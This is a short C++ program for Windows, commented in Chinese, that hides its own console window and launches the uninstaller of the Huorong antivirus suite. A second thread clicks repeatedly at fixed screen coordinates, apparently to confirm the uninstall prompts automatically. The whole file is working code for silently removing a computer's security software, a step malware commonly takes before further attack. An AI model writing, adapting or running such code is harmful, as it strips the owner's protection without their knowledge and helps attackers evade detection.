#include <iostream>
#include <thread>
#include <windows.h>
using namespace std;
void mousemove(){
	for(int i=1;i<=10;++i){
		Sleep(500);
		SetCursorPos(680,580);//移动到指定位置
		mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);//按下左键
		mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);//松开左键
	}
}
void openfile(){
	char s[]=" \"\"C:\\Program Files (x86)\\Huorong\\Sysdiag\\uninst.exe\"\" ";
	cout << s;
	system(s);
}
void hideconsole(){
	HWND hwnd;
	hwnd=FindWindow("ConsoleWindowClass",NULL);	//处理顶级窗口的类名和窗口名称匹配指定的字符串,不搜索子窗口。
	if(hwnd)
	{
		ShowWindow(hwnd,SW_HIDE);				//设置指定窗口的显示状态
	}
}
int main()
{
	hideconsole();
	thread t1(openfile);
	thread t2(mousemove);
	t1.join();
	t2.join();
	return 0;
}
